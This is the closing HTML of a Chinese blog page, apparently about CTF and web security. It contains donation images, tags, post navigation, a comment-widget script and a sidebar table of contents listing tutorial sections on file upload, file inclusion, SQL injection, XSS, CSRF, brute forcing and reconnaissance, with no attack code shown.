        <img src="/images/wechatpay.jpg" alt="v5le0n9 微信支付">
        <p>微信支付</p>
      </div>
      
      <div style="display: inline-block;">
        <img src="/images/alipay.jpg" alt="v5le0n9 支付宝">
        <p>支付宝</p>
      </div>

  </div>
</div>


      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/posts/855b12c4.html" rel="prev" title="RSA算法">
      <i class="fa fa-chevron-left"></i> RSA算法
    </a></div>
      <div class="post-nav-item">
    <a href="/posts/5ada4708.html" rel="next" title="吾爱破解2022春节——Windows中级题">
      吾爱破解2022春节——Windows中级题 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-text">1. 文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E4%BD%8E"><span class="nav-text">1.1 文件上传漏洞[低]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E4%B8%AD"><span class="nav-text">1.2 文件上传漏洞[中]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E9%AB%98"><span class="nav-text">1.3 文件上传漏洞[高]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-4-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-text">1.4 一句话木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-5-weevly%E7%94%A8%E6%B3%95"><span class="nav-text">1.5 weevly用法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-6-htaccess"><span class="nav-text">1.6 .htaccess</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-7-00%E6%88%AA%E6%96%AD"><span class="nav-text">1.7 00截断</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-text">2. 文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI"><span class="nav-text">2.1 本地文件包含(LFI)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-RFI"><span class="nav-text">2.2 远程文件包含(RFI)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-%E5%88%A9%E7%94%A8php-filter%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-text">2.3 利用php:&#x2F;&#x2F;filter伪协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-4-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-%E4%BD%8E"><span class="nav-text">2.4 文件包含漏洞[低]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-%E4%B8%AD"><span class="nav-text">2.2 文件包含漏洞[中]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-%E9%AB%98"><span class="nav-text">2.3 文件包含漏洞[高]</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">3. SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-%E9%94%99%E8%AF%AF%E6%B3%A8%E5%85%A5"><span class="nav-text">3.1 错误注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-1-SQL%E6%B3%A8%E5%85%A5-%E4%BD%8E"><span class="nav-text">3.1.1 SQL注入(低)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text">3.2 时间盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-1-SQL%E7%9B%B2%E6%B3%A8-%E4%BD%8E"><span class="nav-text">3.2.1 SQL盲注[低]</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-text">3.3 堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-4-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5"><span class="nav-text">3.4 自动化注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-1-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5-%E4%BD%8E"><span class="nav-text">3.4.1 自动化注入(低)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-XSS"><span class="nav-text">4. XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB"><span class="nav-text">4.1 XSS跨站脚本攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-XSS%E5%8F%8D%E5%B0%84%E5%9E%8B-%E4%BD%8E"><span class="nav-text">4.2 XSS反射型[低]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-3-XSS%E5%8F%8D%E5%B0%84%E5%9E%8B-%E4%B8%AD"><span class="nav-text">4.3 XSS反射型[中]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-4-XSS%E5%8F%8D%E5%B0%84%E5%9E%8B-%E9%AB%98"><span class="nav-text">4.4 XSS反射型[高]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-5-XSS%E5%AD%98%E5%82%A8%E5%9E%8B-%E4%BD%8E"><span class="nav-text">4.5 XSS存储型[低]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-6-XSS%E5%AD%98%E5%82%A8%E5%9E%8B-%E4%B8%AD"><span class="nav-text">4.6 XSS存储型[中]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-7-XSS%E5%AD%98%E5%82%A8%E5%9E%8B-%E9%AB%98"><span class="nav-text">4.7 XSS存储型[高]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-8-%E8%87%AA%E5%8A%A8%E5%8C%96XSS"><span class="nav-text">4.8 自动化XSS</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-CSRF-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="nav-text">5. CSRF(跨站请求伪造)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#5-1-CSRF-%E4%BD%8E"><span class="nav-text">5.1 CSRF[低]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-2-CSRF-%E4%B8%AD"><span class="nav-text">5.2 CSRF[中]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-3-CSRF-%E9%AB%98"><span class="nav-text">5.3 CSRF[高]</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-CAPTCHA"><span class="nav-text">6. CAPTCHA</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#6-1-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81%E7%A0%81-%E4%BD%8E"><span class="nav-text">6.1 不安全验证码[低]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-2-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81%E7%A0%81-%E4%B8%AD"><span class="nav-text">6.2 不安全验证码[中]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-3-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%AA%8C%E8%AF%81%E7%A0%81-%E9%AB%98"><span class="nav-text">6.3 不安全验证码[高]</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#7-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="nav-text">7. 命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#7-1-ThinkPHP-5%E6%BC%8F%E6%B4%9E"><span class="nav-text">7.1 ThinkPHP 5漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E4%BD%8E"><span class="nav-text">7.2 命令执行漏洞[低]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E4%B8%AD"><span class="nav-text">7.2 命令执行漏洞[中]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-3-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-%E9%AB%98"><span class="nav-text">7.3 命令执行漏洞[高]</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-text">8. 暴力破解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#8-1-%E7%BD%91%E9%A1%B5%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-%E4%BD%8E"><span class="nav-text">8.1 网页密码暴力破解[低]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-2-%E7%BD%91%E9%A1%B5%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-%E4%B8%AD"><span class="nav-text">8.2 网页密码暴力破解[中]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-3-%E7%BD%91%E9%A1%B5%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-%E9%AB%98"><span class="nav-text">8.3 网页密码暴力破解[高]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-4-SSH%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-text">8.4 SSH密码暴力破解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-4-1-hydra"><span class="nav-text">8.4.1 hydra</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-4-2-medusa"><span class="nav-text">8.4.2 medusa</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-4-3-patator"><span class="nav-text">8.4.3 patator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-4-5-brutespray"><span class="nav-text">8.4.5 brutespray</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-4-6-msf"><span class="nav-text">8.4.6 msf</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#8-4-6-1-SSH%E6%A8%A1%E5%9D%97"><span class="nav-text">8.4.6.1. SSH模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-4-6-2-SSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="nav-text">8.4.6.2. SSH用户枚举</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-4-6-3-SSH%E7%89%88%E6%9C%AC%E6%8E%A2%E6%B5%8B"><span class="nav-text">8.4.6.3. SSH版本探测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-4-6-4-SSH%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-text">8.4.6.4. SSH暴力破解</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-4-7-burpsuite"><span class="nav-text">8.4.7 burpsuite</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-5-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E9%98%B2%E5%BE%A1"><span class="nav-text">8.5 暴力破解防御</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#9-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB"><span class="nav-text">9. 中间人攻击</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#10-WEB%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">10. WEB信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#10-1-%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9A%84%E5%86%85%E5%AE%B9"><span class="nav-text">10.1 网络信息收集的内容</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#10-1-1-%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">10.1.1. 网络攻击信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-1-2-%E7%BD%91%E7%BB%9C%E9%98%B2%E5%BE%A1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">10.1.2. 网络防御信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="nav-text">10.2 信息收集的方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-3-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9A%84%E6%8A%80%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">10.3 信息收集的技术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#10-3-1-%E7%BD%91%E7%BB%9C%E8%B8%A9%E7%82%B9%E6%8A%80%E6%9C%AF"><span class="nav-text">10.3.1 网络踩点技术</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#10-3-1-1-%E8%B8%A9%E7%82%B9"><span class="nav-text">10.3.1.1. 踩点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-3-1-2-%E8%B8%A9%E7%82%B9%E7%9B%AE%E7%9A%84"><span class="nav-text">10.3.1.2. 踩点目的</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-3-1-3-%E8%B8%A9%E7%82%B9%E9%92%88%E5%AF%B9%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-text">10.3.1.3. 踩点针对的信息</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-1-3-1-%E7%9B%AE%E6%A0%87%E7%BB%84%E7%BB%87"><span class="nav-text">10.3.1.3.1 目标组织</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-1-3-2-%E7%9B%AE%E6%A0%87%E4%B8%AA%E4%BA%BA"><span class="nav-text">10.3.1.3.2 目标个人</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-3-1-4-%E8%B8%A9%E7%82%B9%E6%8A%80%E6%9C%AF%E6%89%8B%E6%AE%B5"><span class="nav-text">10.3.1.4. 踩点技术手段</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-1-4-1-Web%E4%BF%A1%E6%81%AF%E6%90%9C%E7%B4%A2%E4%B8%8E%E6%8C%96%E6%8E%98"><span class="nav-text">10.3.1.4.1 Web信息搜索与挖掘</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-1-4-1-1-Google-Hacking"><span class="nav-text">10.3.1.4.1.1. Google Hacking</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-1-4-2-Shodan-Hacking"><span class="nav-text">10.3.1.4.2. Shodan Hacking</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-1-4-3-Zoomeye-Hacking"><span class="nav-text">10.3.1.4.3. Zoomeye Hacking</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-1-4-1-4-%E5%85%83%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="nav-text">10.3.1.4.1.4 元搜索引擎</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-1-4-1-5-%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="nav-text">10.3.1.4.1.5 防范措施</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-1-4-2-DNS%E4%B8%8EIP%E6%9F%A5%E8%AF%A2"><span class="nav-text">10.3.1.4.2 DNS与IP查询</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-1-4-2-1-Whois%E6%9F%A5%E8%AF%A2"><span class="nav-text">10.3.1.4.2.1 Whois查询</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-1-4-2-2-%E5%A4%87%E6%A1%88%E4%BF%A1%E6%81%AF"><span class="nav-text">10.3.1.4.2.2 备案信息</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-1-4-2-3-DNS%E6%9C%8D%E5%8A%A1%EF%BC%9A%E4%BB%8EDNS%E5%88%B0IP%E7%9A%84%E6%98%A0%E5%B0%84"><span class="nav-text">10.3.1.4.2.3 DNS服务：从DNS到IP的映射</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-1-4-2-4-IP-gt-location%E6%9F%A5%E8%AF%A2"><span class="nav-text">10.3.1.4.2.4 IP-&gt;location查询</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-1-4-2-5-%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="nav-text">10.3.1.4.2.5 防范措施</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-1-4-3-%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F"><span class="nav-text">10.3.1.4.3 网络侦察</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-1-4-3-1-Traceroute%E8%B7%AF%E7%94%B1%E8%BF%BD%E8%B8%AA"><span class="nav-text">10.3.1.4.3.1 Traceroute路由追踪</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-3-2-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF"><span class="nav-text">10.3.2 网络扫描技术</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#10-3-2-1-%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F-Ping%E6%89%AB%E6%8F%8F"><span class="nav-text">10.3.2.1 主机扫描(Ping扫描)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-3-2-2-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">10.3.2.2 端口扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-2-2-1-TCP%E8%BF%9E%E6%8E%A5%E6%89%AB%E6%8F%8F"><span class="nav-text">10.3.2.2.1 TCP连接扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-2-2-2-SYN%E6%89%AB%E6%8F%8F"><span class="nav-text">10.3.2.2.2 SYN扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-2-2-3-%E9%9A%90%E8%94%BD%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">10.3.2.2.3 隐蔽端口扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-2-2-4-UDP%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">10.3.2.2.4 UDP端口扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-2-2-5-%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="nav-text">10.3.2.2.5 防范措施</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-2-2-6-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-text">10.3.2.2.6 目录扫描</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-3-2-3-%E7%B3%BB%E7%BB%9F%E7%B1%BB%E5%9E%8B%E6%8E%A2%E6%9F%A5"><span class="nav-text">10.3.2.3 系统类型探查</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-2-3-1-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%B1%BB%E5%9E%8B%E6%8E%A2%E6%9F%A5"><span class="nav-text">10.3.2.3.1 操作系统类型探查</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-2-3-1-1-%E5%88%A9%E7%94%A8%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E6%A0%88%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%ABOS"><span class="nav-text">10.3.2.3.1.1 利用网络协议栈指纹识别OS</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-2-3-2-%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E7%B1%BB%E5%9E%8B%E6%8E%A2%E6%9F%A5"><span class="nav-text">10.3.2.3.2 网络服务类型探查</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-2-3-3-%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="nav-text">10.3.2.3.3 防范措施</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-3-2-4-Nmap"><span class="nav-text">10.3.2.4 Nmap</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-3-2-5-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="nav-text">10.3.2.5 漏洞扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-2-4-1-%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E8%BD%AF%E4%BB%B6"><span class="nav-text">10.3.2.4.1 漏洞扫描软件</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-2-4-1-1-Nessus"><span class="nav-text">10.3.2.4.1.1 Nessus</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-2-4-1-2-AWVS"><span class="nav-text">10.3.2.4.1.2 AWVS</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-2-4-1-3-AppScan"><span class="nav-text">10.3.2.4.1.3 AppScan</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-2-4-1-4-BurpSuite"><span class="nav-text">10.3.2.4.1.4 BurpSuite</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-2-4-1-5-OpenVAS"><span class="nav-text">10.3.2.4.1.5 OpenVAS</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-2-4-2-%E9%98%B2%E8%8C%83%E6%8E%AA%E6%96%BD"><span class="nav-text">10.3.2.4.2 防范措施</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#10-3-3-%E7%BD%91%E7%BB%9C%E6%9F%A5%E7%82%B9"><span class="nav-text">10.3.3 网络查点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#10-3-3-1-%E7%BD%91%E7%BB%9C%E6%9F%A5%E7%82%B9%E8%83%BD%E5%A4%9F%E6%94%B6%E9%9B%86%E5%88%B0%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-text">10.3.3.1 网络查点能够收集到的信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-3-3-2-%E7%BD%91%E7%BB%9C%E6%9F%A5%E7%82%B9%E6%8A%80%E6%9C%AF"><span class="nav-text">10.3.3.2. 网络查点技术</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-3-2-1-%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E6%97%97%E6%A0%87%E6%8A%93%E5%8F%96%E6%8A%80%E6%9C%AF"><span class="nav-text">10.3.3.2.1 网络服务旗标抓取技术</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-3-2-2-%E9%80%9A%E7%94%A8%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E6%9F%A5%E7%82%B9"><span class="nav-text">10.3.3.2.2 通用网络服务查点</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-3-2-2-1-FTP%E6%9C%8D%E5%8A%A1%E6%9F%A5%E7%82%B9"><span class="nav-text">10.3.3.2.2.1 FTP服务查点</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-3-2-2-2-SMTP%E6%9C%8D%E5%8A%A1%E6%9F%A5%E7%82%B9"><span class="nav-text">10.3.3.2.2.2 SMTP服务查点</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-3-2-3-%E7%B1%BBUnix%E5%B9%B3%E5%8F%B0%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E6%9F%A5%E7%82%B9"><span class="nav-text">10.3.3.2.3 类Unix平台网络服务查点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#10-3-3-2-4-Windows%E5%B9%B3%E5%8F%B0%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E6%9F%A5%E7%82%B9"><span class="nav-text">10.3.3.2.4 Windows平台网络服务查点</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-3-2-4-1-Windows-Networking-API"><span class="nav-text">10.3.3.2.4.1 Windows Networking API</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-3-2-4-2-NetBIOS"><span class="nav-text">10.3.3.2.4.2 NetBIOS</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-3-2-4-3-MSRPC%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B%E8%B0%83%E7%94%A8-DCOM"><span class="nav-text">10.3.3.2.4.3 MSRPC远程进程调用&#x2F;DCOM</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-3-2-4-4-COM-DCOM"><span class="nav-text">10.3.3.2.4.4 COM&#x2F;DCOM</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-3-2-4-5-%E5%B8%B8%E7%94%A8%E7%9A%84Windows%E5%BA%94%E7%94%A8%E5%B1%82%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1"><span class="nav-text">10.3.3.2.4.5 常用的Windows应用层网络服务</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#10-3-3-2-4-6-Windows%E6%9C%8D%E5%8A%A1"><span class="nav-text">10.3.3.2.4.6 Windows服务</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#11-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90"><span class="nav-text">11. 网络嗅探与协议分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" 